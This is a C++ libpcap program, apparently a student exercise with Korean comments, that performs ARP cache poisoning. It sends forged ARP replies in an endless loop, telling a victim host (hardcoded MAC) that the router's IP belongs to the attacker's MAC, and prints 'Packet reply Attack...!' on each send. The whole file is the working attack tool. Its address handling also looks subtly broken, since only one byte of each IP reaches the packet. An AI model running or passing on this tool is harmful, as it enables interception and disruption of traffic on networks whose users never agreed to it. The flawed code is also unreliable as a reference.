#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <net/if.h> //ifr 사용
#include <netinet/in.h>
#include <sys/ioctl.h>

#pragma pack(push, 1)


struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp-test enp0s8 192.168.43.2 192.168.43.1\n");
}


int get_mMAC(const char *ifname, u_char* myMAC);
//int get_mIP(const char *dev, u_char* myIP);
//void get_smac(pcap_t* handle, uint8_t* mymac, uint8_t* myip, uint8_t* smac,  uint8_t* sip);




int main(int argc, char* argv[]) {
    if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];

    u_char myMAC[6]; //호스트 맥
    get_mMAC(dev, myMAC);

    u_char sender_ip[4]; //argv[2] victim, 핫스팟 킨 노트북
    u_char target_ip[4]; //argv[3] 라우터 ip... 대체할게있나...
	char errbuf[PCAP_ERRBUF_SIZE];

    inet_aton(argv[2], (in_addr*)sender_ip); // victim
    inet_aton(argv[3], (in_addr*)target_ip); // router

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
        fprintf(stderr, "연결이 잘못되었습니다. %s(%s)\n", dev, errbuf);
		return -1;
	}

     //패킷생성 -by 길길
     EthArpPacket packet;

   // get_smac(handle, myMAC, myIP, sMAC, sender_ip);

    packet.eth_.dmac_ = Mac("F8:A2:D6:E0:45:AF"); //목적지 mac 얻는 법???
    packet.eth_.smac_ = Mac(myMAC);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(myMAC);
    packet.arp_.sip_ = htonl(*target_ip); //htonl(Ip(*target_ip));
    packet.arp_.tmac_ = Mac("F8:A2:D6:E0:45:AF"); //필요함 Mac(sMAC)
    packet.arp_.tip_ = htonl(*sender_ip); //victim htonl(Ip(*sender_ip))


     while(1){
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        printf("Packet reply Attack...!\n");

	if (res != 0) {
        fprintf(stderr, "pcap_send error : %d, %s\n", res, pcap_geterr(handle));
	}
     }

	pcap_close(handle);
}

int get_mMAC(const char *dev, u_char* myMAC){
         struct ifreq s;
        int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
        strcpy(s.ifr_name, dev);//주소변경

        if(!ioctl(fd, SIOCGIFHWADDR, &s)){
            for(int i =0; i<6; i++){
                myMAC[i] = s.ifr_addr.sa_data[i];
            }
        }
        return 1;
}

